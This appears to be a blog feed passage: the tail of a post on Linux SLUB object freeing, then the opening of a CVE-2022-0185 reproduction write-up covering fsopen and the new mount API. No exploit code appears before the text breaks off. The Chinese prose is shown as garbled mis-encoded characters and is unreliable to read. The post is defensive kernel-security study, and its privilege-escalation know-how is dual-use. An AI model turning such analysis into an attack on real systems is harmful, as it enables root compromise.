class="hljs-keyword">struct</span> folio *<span class="hljs-title function_">virt_to_folio</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *x)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> virt_to_page(x);<br><br><span class="hljs-keyword">return</span> page_folio(page);<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> page_folio(p)(_Generic((p),\</span><br><span class="hljs-meta">const struct page *:(const struct folio *)_compound_head(p), \</span><br><span class="hljs-meta">struct page *:(struct folio *)_compound_head(p)))</span><br></code></pre></td></tr></table></figure><p>ç„¶å <code>folio_test_slab()</code> å…¶å®æ˜¯ <code>include/linux/page-flags.h</code> é‡Œçš„æ‹¼æ¥å®ï¼Œè¿™é‡Œå°±ä¸æ·±å…¥å±•å¼€äº†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">bool</span> folio_test_#<span class="hljs-meta">#lname(struct folio *folio)\</span><br><span class="hljs-meta">&#123; return test_bit(PG_##lname, folio_flags(folio, FOLIO_##policy)); &#125;\</span><br></code></pre></td></tr></table></figure><h3 id="II-free-large-kmalloc-ï¼šç›´æ¥å°†é¡µé¢é‡Šæ”¾å›-buddy-system">II. free_large_kmalloc()ï¼šç›´æ¥å°†é¡µé¢é‡Šæ”¾å› buddy system</h3><p>æ­£å¦‚å¯¹äºå¤§å¯¹è±¡çš„åˆ†é… <code>kmalloc_large()</code> ä¼šç›´æ¥ä» buddy system è¯·æ±‚å†…å­˜ä¸€èˆ¬ï¼Œç›¸å¯¹åº”çš„ <code>free_large_kmalloc()</code> ä¹Ÿä¼šç›´æ¥å°†é¡µé¢é‡Šæ”¾å› buddy systemï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">free_large_kmalloc</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> folio *folio, <span class="hljs-type">void</span> *object)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order = folio_order(folio);<br><br><span class="hljs-keyword">if</span> (WARN_ON_ONCE(order == <span class="hljs-number">0</span>))<br>pr_warn_once(<span class="hljs-string">&quot;object pointer: 0x%p\n&quot;</span>, object);<br><br>kmemleak_free(object);<br>kasan_kfree_large(object);<br>kmsan_kfree_large(object);<br><br>mod_lruvec_page_state(folio_page(folio, <span class="hljs-number">0</span>), NR_SLAB_UNRECLAIMABLE_B,<br>      -(PAGE_SIZE &lt;&lt; order));<br>__free_pages(folio_page(folio, <span class="hljs-number">0</span>), order);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="III-kmem-cache-free-ï¼šå¸¸è§„çš„é‡Šæ”¾å‡½æ•°">III. __kmem_cache_free()ï¼šå¸¸è§„çš„é‡Šæ”¾å‡½æ•°</h3><p><code>__kmem_cache_free()</code> ä¸»è¦å°±æ˜¯å¯¹ <code>slab_free()</code> çš„ wrapperï¼Œä¸è¿‡ä¼šæŒ‡å®š tail ä¸º NULLï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __kmem_cache_free(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">void</span> *x, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> caller)<br>&#123;<br>slab_free(s, virt_to_slab(x), x, <span class="hljs-literal">NULL</span>, &amp;x, <span class="hljs-number">1</span>, caller);<br>&#125;<br></code></pre></td></tr></table></figure><p>è€Œ <code>slab_free()</code> åˆ™ä¼šæœ€ç»ˆè°ƒç”¨åˆ° <code>do_slab_free()</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __fastpath_inline <span class="hljs-type">void</span> <span class="hljs-title function_">slab_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> slab *slab,</span><br><span class="hljs-params">      <span class="hljs-type">void</span> *head, <span class="hljs-type">void</span> *tail, <span class="hljs-type">void</span> **p, <span class="hljs-type">int</span> cnt,</span><br><span class="hljs-params">      <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr)</span><br>&#123;<br>memcg_slab_free_hook(s, slab, p, cnt);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * With KASAN enabled slab_free_freelist_hook modifies the freelist</span><br><span class="hljs-comment"> * to remove objects, whose reuse must be delayed.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (slab_free_freelist_hook(s, &amp;head, &amp;tail, &amp;cnt))<br>do_slab_free(s, slab, head, tail, cnt, addr);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç”¨åˆ°äº†ä¸€ä¸ªå‡½æ•° <code>slab_free_freelist_hook()</code>ï¼Œä¸»è¦çš„ä½œç”¨æ˜¯éå†å¾…é‡Šæ”¾çš„ freelistï¼š</p><ul><li>å¦‚æœè®¾ç½®äº† free hookï¼ˆ <code>slab_free_hook() == true</code> ï¼‰ï¼Œåˆ™ä»…å‡å°‘è®¡æ•°ä»¥æ¨è¿Ÿé‡Šæ”¾</li><li>å¦åˆ™é‡æ–°å»ºç«‹ä¸€é freelist åè¿”å›</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">slab_free_freelist_hook</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s,</span><br><span class="hljs-params">   <span class="hljs-type">void</span> **head, <span class="hljs-type">void</span> **tail,</span><br><span class="hljs-params">   <span class="hljs-type">int</span> *cnt)</span><br>&#123;<br><br><span class="hljs-type">void</span> *object;<br><span class="hljs-type">void</span> *next = *head;<br><span class="hljs-type">void</span> *old_tail = *tail ? *tail : *head;<br><br><span class="hljs-keyword">if</span> (is_kfence_address(next)) &#123;<br>slab_free_hook(s, next, <span class="hljs-literal">false</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-comment">/* Head and tail of the reconstructed freelist */</span><br>*head = <span class="hljs-literal">NULL</span>;<br>*tail = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">do</span> &#123;<br>object = next;<br>next = get_freepointer(s, object);<br><br><span class="hljs-comment">/* If object&#x27;s reuse doesn&#x27;t have to be delayed */</span><br><span class="hljs-keyword">if</span> (!slab_free_hook(s, object, slab_want_init_on_free(s))) &#123;<br><span class="hljs-comment">/* Move object to the new freelist */</span><br>set_freepointer(s, object, *head);<br>*head = object;<br><span class="hljs-keyword">if</span> (!*tail)<br>*tail = object;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Adjust the reconstructed freelist depth</span><br><span class="hljs-comment"> * accordingly if object&#x27;s reuse is delayed.</span><br><span class="hljs-comment"> */</span><br>--(*cnt);<br>&#125;<br>&#125; <span class="hljs-keyword">while</span> (object != old_tail);<br><br><span class="hljs-keyword">if</span> (*head == *tail)<br>*tail = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">return</span> *head != <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ä¸‰ã€ä¸Šå±‚è°ƒç”¨æ¥å£å…³ç³»å›¾-2">ä¸‰ã€ä¸Šå±‚è°ƒç”¨æ¥å£å…³ç³»å›¾</h2><p>æ¶‰åŠåˆ°å†…å­˜é‡Šæ”¾çš„å‡½æ•°ç›¸è¾ƒäºå†…å­˜åˆ†é…å…¶å®å°‘å¾ˆå¤šï¼Œå¸¸ç”¨çš„ä¸»è¦å°±æ˜¯ <code>kfree()</code>ã€<code>kfree_sensitive()</code>ã€<code>kmem_cache_free()</code> è¿™ä¸‰å¤§å‡½æ•°ï¼š</p><p><img src="https://s2.loli.net/2023/02/24/Itbqo2eO15yn7ZW.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;æ¯”èµ·å¤§çš„pageğŸ‘´è¿˜æ˜¯å–œæ¬¢å°çš„object&lt;/p&gt;</summary>
    
    
    
    <category term="OS" scheme="http://blog.arttnba3.cn/categories/OS/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="å­¦ä¹ æœ­è®°" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="å†…å­˜ç®¡ç†" scheme="http://blog.arttnba3.cn/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    
    <category term="slub allocator" scheme="http://blog.arttnba3.cn/tags/slub-allocator/"/>
    
  </entry>
  
  <entry>
    <title>ã€CVE.0x09ã€‘CVE-2022-0185 æ¼æ´å¤ç°åŠç®€è¦åˆ†æ</title>
    <link href="http://blog.arttnba3.cn/2023/01/11/CVE-0X09-CVE-2022-0185/"/>
    <id>http://blog.arttnba3.cn/2023/01/11/CVE-0X09-CVE-2022-0185/</id>
    <published>2023-01-11T04:04:19.000Z</published>
    <updated>2023-01-15T05:52:06.992Z</updated>
    
    <content type="html"><![CDATA[<p>è¿˜æ˜¯ mount å¥½</p><span id="more"></span><h1>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0185">CVE-2022-0185</a> æ˜¯ 2022 å¹´åˆçˆ†å‡ºæ¥çš„ä¸€ä¸ªä½äº filesystem context ç³»ç»Ÿä¸­çš„ <code>fsconfig</code> ç³»ç»Ÿè°ƒç”¨ä¸­çš„ä¸€ä¸ªå †æº¢å‡ºæ¼æ´ï¼Œå¯¹äºæœ‰ç€ <code>CAP_SYS_ADMIN</code> æƒé™ï¼ˆæˆ–æ˜¯å¼€å¯äº† unprivileged namespaceï¼‰çš„æ”»å‡»è€…è€Œè¨€å…¶å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´å®Œæˆæœ¬åœ°ææƒï¼Œè¯¥æ¼æ´è·å¾—äº†é«˜è¾¾ <code>8.4</code> çš„ CVSS è¯„åˆ†</p><blockquote><p>å‘ç°æ¼æ´çš„å®‰å…¨ç ”ç©¶å‘˜çš„æŒ–æ˜ä¸åˆ©ç”¨è¿‡ç¨‹å‚è§<a href="https://www.willsroot.io/2022/01/cve-2022-0185.html">è¿™é‡Œ</a>ï¼Œæœ¬æ–‡ç¼–å†™æ—¶ä¹Ÿæœ‰ä¸€å®šå‚è€ƒ</p></blockquote><p>æœ¬æ–‡é€‰æ‹©å†…æ ¸ç‰ˆæœ¬ <code>5.4</code> è¿›è¡Œåˆ†æï¼Œåœ¨å¼€å§‹åˆ†æä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥è¡¥å……ä¸€äº›åŸºç¡€çŸ¥è¯†</p><h2 id="Filesystem-mount-API-åˆæ¢">Filesystem mount API åˆæ¢</h2><blockquote><p>å‚è§<a href="https://zhuanlan.zhihu.com/p/93592262">çŸ¥ä¹ä¸Šçš„è¯¥ç³»åˆ—æ–‡ç« </a></p></blockquote><p>ç›¸ä¿¡å¤§å®¶å¯¹äº Linux ä¸‹çš„æ–‡ä»¶ç³»ç»Ÿçš„æŒ‚è½½éƒ½æ˜¯éå¸¸ç†Ÿæ‚‰â€”â€” <code>mount</code>  ç³»ç»Ÿè°ƒç”¨è¢«ç”¨ä»¥å°†æ–‡ä»¶ç³»ç»ŸæŒ‚è½½åˆ°ä»¥ <code>/</code> ä¸ºæ ¹èŠ‚ç‚¹çš„æ–‡ä»¶æ ‘ä¸Šï¼Œä¾‹å¦‚æˆ‘ä»¬å¯ä»¥ç”¨å¦‚ä¸‹å‘½ä»¤æŒ‚è½½ç¡¬ç›˜ <code>/dev/sdb1</code> åˆ° <code>/mnt/temp</code> ç›®å½•ä¸‹ï¼Œä¹‹åå°±èƒ½åœ¨è¯¥ç›®å½•ä¸‹è¿›è¡Œæ–‡ä»¶è®¿é—®ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mount /dev/sdb1 /mnt/temp</span><br></code></pre></td></tr></table></figure><p>æˆ–æ˜¯é€šè¿‡ç¼–å†™ç¨‹åºçš„æ–¹å¼ä½¿ç”¨è£¸çš„ <code>mount</code> ç³»ç»Ÿè°ƒç”¨è¿›è¡ŒæŒ‚è½½ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mount.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">4</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[-] Usage: moount &#123;dev_path&#125; &#123;mount_point&#125; &#123;fs_type&#125;&quot;</span>)<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (mount(argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>], argv[<span class="hljs-number">3</span>], <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed to mount %s at %s by file system type: %s!\n&quot;</span>, <br>              argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>], argv[<span class="hljs-number">3</span>]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Successful to mount %s at %s by file system type: %s.\n&quot;</span>, <br>              argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>], argv[<span class="hljs-number">3</span>]);<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯<a href="https://lwn.net/Articles/753473/">æ€»æœ‰äº›äººæƒ³æä¸ªå¤§æ–°é—»</a>ï¼Œä»¥ AL Viro ä¸ºé¦–çš„å¼€å‘è€…è®¤ä¸ºæ—§çš„ <code>mount</code> ç³»ç»Ÿè°ƒç”¨å­˜åœ¨è¯¸å¤šæ¼æ´ä¸è®¾è®¡ç¼ºé™·ï¼Œäºæ˜¯å†³å®šé‡å†™ä¸€å¥—æ–°çš„ mount APIï¼Œå¹¶<a href="https://patchwork.kernel.org/project/linux-security-module/cover/153754740781.17872.7869536526927736855.stgit@warthog.procyon.org.uk/">æˆåŠŸè¢«åˆå¹¶åˆ°å†…æ ¸ä¸»çº¿</a>ï¼Œç§°ä¹‹ä¸º <a href="https://docs.kernel.org/filesystems/mount_api.html">Filesystem Mount API</a></p><p>æ–°çš„ mount API å°†è¿‡å»çš„ä¸€ä¸ªç®€å•çš„ <code>mount</code> ç³»ç»Ÿè°ƒç”¨çš„åŠŸèƒ½æ‹†åˆ†æˆäº†æ•°ä¸ªæ–°çš„ç³»ç»Ÿè°ƒç”¨ï¼Œå¯¹åº”ä¸åŒçš„æ–‡ä»¶ç³»ç»ŸæŒ‚è½½é˜¶æ®µï¼Œäºæ˜¯ä¹ç°åœ¨ Linux ä¸Šæœ‰ç€ä¸¤å¥—å¹¶è¡Œçš„ mount API</p><blockquote><p><s>ğŸ‘´çš„è¯„ä»·æ˜¯é—²ç€æ²¡äº‹å¹²å¯ä»¥å»æŠŠæ‘å£å¤§ç²ªæŒ‘ä¸€ä¸‹</s></p></blockquote><h3 id="Step-I-fsopen-è·å–ä¸€ä¸ª-filesystem-context">Step.I - fsopen: è·å–ä¸€ä¸ª filesystem context</h3><p>è¿˜è®°å¾—ç¬”è€…ä»¥å‰è¯´è¿‡çš„ <a href="https://arttnba3.cn/2021/02/21/OS-0X00-LINUX-KERNEL-PART-I/#%E4%B8%80%E3%80%81%E2%80%9C%E4%B8%87%E7%89%A9%E7%9A%86%E6%96%87%E4%BB%B6%E2%80%9D">Linux ä¸­ä¸€åˆ‡çš†æ–‡ä»¶</a> çš„å“²å­¦å—ï¼Œåœ¨æ–°çš„ mount API ä¸­ä¹Ÿéµå¾ªäº†è¿™æ ·çš„å“²å­¦â€”â€”å¦‚æœè¯´ <code>open()</code> ç³»ç»Ÿè°ƒç”¨ç”¨ä»¥æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶å¹¶æä¾›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œé‚£ä¹ˆ <strong><code>fsopen()</code> ç³»ç»Ÿè°ƒç”¨ä¾¿ç”¨äºæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶æä¾›ä¸€ä¸ªâ€æ–‡ä»¶ç³»ç»Ÿæè¿°ç¬¦â€œ</strong>â€”â€”ç§°ä¹‹ä¸º <strong><code>æ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡</code></strong>ï¼ˆfilesystem contextï¼‰</p><p><img src="https://i.loli.net/2021/02/25/iUoHNsaK5vOG9cR.png" alt="wait, it's all FILES"></p><p>ç”±äºæ ‡å‡†åº“ä¸­è¿˜æœªæ·»åŠ  new mount API ç›¸å…³çš„ä»£ç ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å†™ raw syscall æ¥è¿›è¡Œç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨ï¼Œä¾‹å¦‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ä»£ç æ‰“å¼€ä¸€ä¸ªç©ºç™½çš„ <code>ext4</code> æ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡ï¼ˆéœ€è¦ <code>CAP_SYS_ADMIN</code> æƒé™ï¼Œæˆ–æ˜¯å¼€å¯äº† unprivileged namespace çš„æƒ…å†µä¸‹ä½¿ç”¨ <code>unshare()</code> ç³»ç»Ÿè°ƒç”¨åˆ›å»ºå¸¦æœ‰è¯¥æƒé™çš„ namespaceï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd;<br>    <br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] FAILED to fsopen!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œåˆ›å»ºçš„æ˜¯ä¸€ä¸ª<strong>ç©ºç™½çš„æ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡</strong>ï¼Œå¹¶æ²¡æœ‰ä¸ä»»ä½•å®é™…è®¾å¤‡æˆ–æ–‡ä»¶è¿›è¡Œå…³è”â€”â€”è¿™æ˜¯æˆ‘ä»¬éœ€è¦åœ¨æ¥ä¸‹æ¥çš„æ­¥éª¤ä¸­å®Œæˆçš„é…ç½®</p><h4 id="âœ³-fsopen-in-kernel"><strong>âœ³</strong> fsopen() in kernel</h4><blockquote><p>superblockã€dentry è¿™ç±»çš„ VFS åŸºç¡€çŸ¥è¯†ä¸åœ¨æ­¤å¤„ç§‘æ™®ï¼Œè¯·è‡ªè¡Œäº†è§£ï¼šï¼‰</p></blockquote><p>åœ¨å†…æ ¸å½“ä¸­ï¼Œ<code>fsopen()</code> ç³»ç»Ÿè°ƒç”¨çš„è¡Œä¸ºå®é™…ä¸Šå¯¹åº”åˆ›å»ºçš„æ˜¯ä¸€ä¸ª <code>fs_context</code> ç»“æ„ä½“ä½œä¸º filesystem contextï¼Œåˆ›å»ºä¸€ä¸ªå¯¹åº”çš„ file ç»“æ„ä½“å¹¶åˆ†é…ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æŒ‰åç§°æ‰“å¼€æ–‡ä»¶ç³»ç»Ÿä»¥ä¾¿äºå¯¹å…¶è¿›è¡Œè®¾ç½®ä»¥æŒ‚è½½</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * æˆ‘ä»¬è¢«å…è®¸æŒ‡å®šåœ¨å“ªä¸ªå®¹å™¨ä¸­æ‰“å¼€æ–‡ä»¶ç³»ç»Ÿï¼Œç”±æ­¤æŒ‡ç¤ºè¦ä½¿ç”¨å“ªä¸€ä¸ªå‘½åç©ºé—´</span><br><span class="hljs-comment"> * (å°¤å…¶æ˜¯å°†å“ªä¸ªç½‘ç»œå‘½åç©ºé—´ç”¨äºç½‘ç»œæ–‡ä»¶ç³»ç»Ÿ).</span><br><span class="hljs-comment"> */</span><br>SYSCALL_DEFINE2(fsopen, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, _fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, flags)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_system_type</span> *<span class="hljs-title">fs_type</span>;</span><span class="hljs-comment">//æ–‡ä»¶ç³»ç»Ÿç±»å‹</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> *<span class="hljs-title">fc</span>;</span><span class="hljs-comment">//æ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name;<br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-comment">// capabilities æœºåˆ¶ï¼Œæ£€æŸ¥å¯¹åº”ã€å‘½åç©ºé—´ã€‘æ˜¯å¦æœ‰ CAP_SYS_ADMIN æƒé™</span><br><span class="hljs-keyword">if</span> (!ns_capable(current-&gt;nsproxy-&gt;mnt_ns-&gt;user_ns, CAP_SYS_ADMIN))<br><span class="hljs-keyword">return</span> -EPERM;<br><br><span class="hljs-keyword">if</span> (flags &amp; ~FSOPEN_CLOEXEC)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-comment">// æ‹·è´ç”¨æˆ·ä¼ å…¥çš„æ–‡ä»¶ç³»ç»Ÿå</span><br>fs_name = strndup_user(_fs_name, PAGE_SIZE);<br><span class="hljs-keyword">if</span> (IS_ERR(fs_name))<br><span class="hljs-keyword">return</span> PTR_ERR(fs_name);<br><br><span class="hljs-comment">// æŒ‰åç§°è·å–æ–‡ä»¶ç³»ç»Ÿç±»å‹</span><br>fs_type = get_fs_type(fs_name);<br>kfree(fs_name);<br><span class="hljs-keyword">if</span> (!fs_type)<br><span class="hljs-keyword">return</span> -ENODEV;<br><br><span class="hljs-comment">// åˆ›å»ºæ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡ç»“æ„ä½“</span><br>fc = fs_context_for_mount(fs_type, <span class="hljs-number">0</span>);<br>put_filesystem(fs_type);<br><span class="hljs-keyword">if</span> (IS_ERR(fc))<br><span class="hljs-keyword">return</span> PTR_ERR(fc);<br><br>fc-&gt;phase = FS_CONTEXT_CREATE_PARAMS;<br><br><span class="hljs-comment">// åˆ†é… Logging buffer</span><br>ret = fscontext_alloc_log(fc);<br><span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> err_fc;<br><br><span class="hljs-comment">// åˆ›å»º file ç»“æ„ä½“å¹¶åˆ†é…æ–‡ä»¶æè¿°ç¬¦</span><br><span class="hljs-keyword">return</span> fscontext_create_fd(fc, flags &amp; 